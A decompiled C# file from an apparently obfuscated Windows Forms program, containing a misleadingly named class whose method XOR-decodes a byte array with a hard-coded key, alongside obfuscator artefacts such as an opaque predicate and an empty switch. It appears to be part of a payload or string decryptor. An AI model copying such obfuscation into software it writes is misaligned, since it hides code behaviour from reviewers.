using System.Collections.Generic;
using System.Text;

namespace WindowsFormsApp23;

internal static class PrinterErrorExpression
{
	private static PrinterErrorExpression CloneMapping;

	internal static byte[] CloneExporter(byte[] info)
	{
		string s = "Fsgbnfyuadmsgvsjd";
		byte[] bytes = Encoding.ASCII.GetBytes(s);
		List<byte> list = new List<byte>();
		int i = 0;
		if (_003CModule_003E_007B9a2a1a0a_002D789a_002D461c_002D8cbf_002D56f97ef811af_007D.m_36884bec82d7431cbc34e5e71b8cda12.m_21c92073aff84908a8249b1c8f8ae4e5 != 0)
		{
			switch (0)
			{
			}
		}
		for (; i < info.Length; i++)
		{
			list.Add((byte)(bytes[i % bytes.Length] ^ info[i]));
		}
		return list.ToArray();
	}

	internal static bool DisableMapping()
	{
		return CloneMapping == null;
	}

	internal static PrinterErrorExpression StopMapping()
	{
		return CloneMapping;
	}
}
